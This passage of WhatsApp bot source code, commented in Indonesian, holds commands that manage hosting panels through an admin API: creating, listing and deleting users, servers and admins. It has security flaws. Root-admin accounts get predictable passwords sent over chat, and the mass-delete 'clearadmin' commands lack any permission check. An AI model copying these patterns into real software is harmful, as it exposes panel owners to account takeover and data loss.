 m.reply("Terjadi kesalahan saat menerjemahkan teks. Pastikan format dan kode bahasa sudah benar.");
 }
}
break;

case 'fiturnew': {
 if (fiturNew.fitur.length === 0) {
 return m.reply("Tidak ada fitur baru yang ditambahkan.");
 }

 // Format daftar fitur baru untuk ditampilkan
 let message = "🌟 *Fitur Terbaru yang Ditambahkan* 🌟\n\n";
 fiturNew.fitur.forEach((fitur, index) => {
 message += `${index + 1}. ${fitur}\n`;
 });

 m.reply(message);
}
break;

// Case untuk menambahkan fitur baru ke daftar
case 'addfitur': {
 if (!isPrem && !isCreator) return m.reply("❌ Hanya admin atau developer yang dapat menambahkan fitur baru.");
 
 if (!text) return m.reply(`Contoh: ${prefix + command} nama_fitur_baru`);

 let fiturBaru = text.trim();

 if (fiturNew.fitur.includes(fiturBaru)) {
 return m.reply("⚠️ Fitur ini sudah ada dalam daftar fitur terbaru.");
 }

 fiturNew.fitur.push(fiturBaru);

 // Simpan perubahan ke file fiturnew.json
 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply(`✅ Fitur "${fiturBaru}" berhasil ditambahkan ke daftar fitur terbaru.`);
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menyimpan daftar fitur baru.");
 }
}
break;

// Case untuk menghapus daftar fitur terbaru
case 'clearfitur': {
 if (!isPrem && !isCreator) return m.reply("❌ Hanya admin atau developer yang dapat menghapus daftar fitur.");

 fiturNew.fitur = [];

 try {
 fs.writeFileSync('./fiturnew.json', JSON.stringify(fiturNew, null, 2));
 m.reply("✅ Daftar fitur terbaru berhasil dihapus.");
 } catch (err) {
 console.error("Gagal menyimpan fiturnew.json", err);
 m.reply("❌ Terjadi kesalahan saat menghapus daftar fitur.");
 }
}
break;

;







case 'updomain2':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain2 = newteks;

 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'upapikey2':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey2 = newteks;
 return Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

case 'upcapikey2':{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey2 = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;

case 'cadmin2': {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let s = q.split('-');
 let email = s[0];
 let username = s[0];
 let nomor = s[1];

 if (s.length < 2) return Aanz.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
 if (!username) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
 if (!nomor) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

 let password = username + "AanzCuyxzzz";
 let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

 // Membuat permintaan ke API untuk membuat user di server 2
 let f = await fetch(global.domain2 + "/api/application/users", {
 "method": "POST",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2
 },
 "body": JSON.stringify({
 "email": username + "@gmail.com",
 "username": username,
 "first_name": username,
 "last_name": "Memb",
 "language": "en",
 "root_admin": true,
 "password": password.toString()
 })
 });

 let data = await f.json();

 if (data.errors) return Aanz.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

 let user = data.attributes;

 let tks = `*_Admin untuk Server 2 telah dibuat dan datanya telah dikirim ✅_*`;

 // Kirim pesan dengan detail akun admin
 await Aanz.sendMessage(m.chat, { text: tks }, { quoted: m });

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke nomor yang ditentukan
 await Aanz.sendMessage(nomornya, {
 video: { url: videoUrl },
 caption: `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*
`,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });
}
break;

case 'cadmin3': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

    let s = q.split('-');
    let email = s[0];
    let username = s[0];
    let nomor = s[1];

    if (s.length < 2) return Aanz.sendMessage(m.chat, { text: `*Format salah!*\nPenggunaan:\n${prefix + command} user-nomer` });
    if (!username) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} example,@user` });
    if (!nomor) return Aanz.sendMessage(m.chat, { text: `Ex : ${prefix + command} Username-@tag/nomor\n\nContoh :\n${prefix + command} example-@user` });

    let password = username + "AanzCuyxzzz";
    let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    try {
        // Membuat permintaan ke API untuk membuat user di server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            "method": "POST",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3
            },
            "body": JSON.stringify({
                "email": username + "@gmail.com",
                "username": username,
                "first_name": username,
                "last_name": "Memb",
                "language": "en",
                "root_admin": true,
                "password": password.toString()
            })
        });

        let data = await f.json();

        if (data.errors) return Aanz.sendMessage(m.chat, { text: JSON.stringify(data.errors[0], null, 2) });

        let user = data.attributes;

        let tks = `*_Admin untuk Server 3 telah dibuat dan datanya telah dikirim ✅_*`;

        // Kirim pesan dengan detail akun admin
        await Aanz.sendMessage(m.chat, { text: tks }, { quoted: m });

        // URL video thumbnail
        const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

        // Kirim pesan ke nomor yang ditentukan
        await Aanz.sendMessage(nomornya, {
            video: { url: videoUrl },
            caption: `┌───「 *AanzCuyxzzz-V3* 」───
│ *Username* : ${username}
│ *Password* : ${password}
│ *link* : ${global.domain3}
└───────────────────
> *_© Developer : AanzCuyxzzz_*
`,
            gifPlayback: true,
            gifAttribution: 1,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'AanzCuyxzzz - V3',
                    body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            },
        });

    } catch (error) {
        m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
    break;
}

case 'listadmin2':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain2 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 2 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 2*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 2.");
 }
}
break;



case 'listserver2':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input

 try {
 let f = await fetch(global.domain2 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey2}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 2.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video atau GIF

 let teks = `╭─❒ *List Server di Server 2*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - List Server 2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 2.");
 }
}
break;


case 'listserver3':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(global.domain3 + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Cek jika API mengembalikan error
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan di Server 3.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video/GIF

 let teks = `╭─❒ *List Server di Server 3*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description || 'Tidak ada deskripsi'}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➡️ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan dengan multimedia
 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - List Server 3',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server di Server 3.");
 }
 break;
}


case 'listuser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    
    let page = parseInt(args[0]) || 1; // Halaman default ke 1 jika tidak ada input
    
    try {
        let f = await fetch(global.domain3 + "/api/application/users?page=" + page, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res = await f.json();

        // Jika terjadi error pada respons API
        if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);

        let users = res.data;
        if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 3.");

        // Format pesan daftar user
        let messageText = "*Berikut adalah daftar pengguna di Server 3:*\n\n";
        for (let user of users) {
            let u = user.attributes;
            messageText += `🆔 *ID*: ${u.id}\n`;
            messageText += `🔹 *Username*: ${u.username}\n`;
            messageText += `📛 *Nama*: ${u.first_name} ${u.last_name}\n`;
            messageText += `📊 *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
            messageText += `-----------------------------\n`;
        }

        messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
        messageText += `👤 *Total User*: ${res.meta.pagination.total}\n`;

        // Kirim pesan
        await Aanz.sendMessage(m.chat, { text: messageText }, { quoted: m });

        // Navigasi ke halaman berikutnya
        if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
            m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
        }
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil data user di server 3.");
    }
    break;
}

case 'listadmin3':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input
 try {
 let f = await fetch(global.domain3 + `/api/application/users?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${global.apikey3}`
 }
 });

 let res = await f.json();

 // Jika tidak ada data admin
 if (!res.data || res.data.length === 0) {
 return m.reply(`❌ Tidak ditemukan admin di server 3 pada halaman ${page}.`);
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

 let teks = `╭─❒ *List Admin Server 3*\n`;

 for (let user of res.data) {
 let u = user.attributes;
 if (u.root_admin) { // Cek jika user adalah admin
 teks += `├ *ID*: ${u.id}\n`;
 teks += `├ *Username*: ${u.username}\n`;
 teks += `├ *Name*: ${u.first_name} ${u.last_name}\n`;
 teks += `├ *Email*: ${u.email}\n`;
 teks += `├ *Status*: ${u.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Admin*: ${res.meta.pagination.count}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V3',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 3.");
 }
}
break;




case 'listuser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input
 
 try {
 let f = await fetch(global.domain2 + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 2.");

 let messageText = "*Berikut adalah daftar user di Server 2:*\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `🆔 *ID*: ${u.id} - *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `👤 *Username*: ${u.username}\n`;
 messageText += `📌 *Nama*: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `🖥️ *Total User*: ${res.meta.pagination.total}\n`;

 // Kirim pesan
 await Aanz.sendMessage(m.chat, { text: messageText }, { quoted: m });

 // Navigasi ke halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data user di server 2.");
 }
}
break;

case 'deladmin2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin2`);
 
 try {
 // Ambil daftar admin dari server 2
 let cek = await fetch(global.domain2 + "/api/application/users?page=1", {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Looping untuk mencari admin berdasarkan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 // Hapus admin menggunakan ID yang ditemukan
 try {
 let delusr = await fetch(global.domain2 + `/api/application/users/${idadmin}`, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Validasi apakah penghapusan berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 2.`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break;
 }
 }

 // Jika ID admin tidak ditemukan
 if (!getid) {
 m.reply("❌ Admin dengan ID tersebut tidak ditemukan di server 2 atau bukan root admin.");
 }
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba mengambil data admin: ${err.message}`);
 }
}
break;

case 'delserver2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/servers/" + srv, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server dari server 2.');
 }
}
break;

case 'deladmin3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin3`);
    
    try {
        // Ambil daftar admin dari server 3
        let cek = await fetch(global.domain3 + "/api/application/users?page=1", {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res3 = await cek.json();
        let users = res3.data;
        let getid = null;
        let idadmin = null;

        // Looping untuk mencari admin berdasarkan ID
        for (let e of users) {
            if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                getid = e.attributes.username;
                idadmin = e.attributes.id;

                // Hapus admin menggunakan ID yang ditemukan
                try {
                    let delusr = await fetch(global.domain3 + `/api/application/users/${idadmin}`, {
                        method: "DELETE",
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json",
                            Authorization: "Bearer " + global.apikey3
                        }
                    });

                    // Validasi apakah penghapusan berhasil
                    if (!delusr.ok) {
                        throw new Error('Gagal menghapus admin!');
                    }

                    m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 3.`);
                } catch (err) {
                    console.error(err);
                    m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
                }
                break;
            }
        }

        // Jika ID admin tidak ditemukan
        if (!idadmin) {
            m.reply(`❌ Tidak ditemukan admin dengan ID ${args[0]} di server 3.`);
        }
    } catch (error) {
        console.error(error);
        m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
    break;
}

case 'deluser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/users/" + usr, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user dari server 2.');
 }
}
break;

case 'deluser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    let usr = args[0]; // ID user yang ingin dihapus
    if (!usr) return m.reply('ID usernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/users/" + usr, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus user dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
            m.reply(`❌ Gagal menghapus user dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus user dari server 3.');
    }
    break;
}

case 'clearadmin2': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin2 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 2
        let f = await fetch(global.domain2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 2.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
                continue;
            }

            // Menghapus user dari server 2
            let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 2!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

case 'delserver3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    let srv = args[0]; // ID server yang ingin dihapus
    if (!srv) return m.reply('ID servernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/servers/" + srv, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus server dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
            m.reply(`❌ Gagal menghapus server dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus server dari server 3.');
    }
    break;
}

case 'clearadmin3': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin3 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
                continue;
            }

            // Menghapus user dari server 3
            let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : AanzCuyxzzz_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 3!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
case 'buypanel': {
    try {
        // Validasi awal
        if (!m || !m.chat || !m.sender) {
            console.error('Error: Objek m atau properti m.sender tidak ditemukan.');
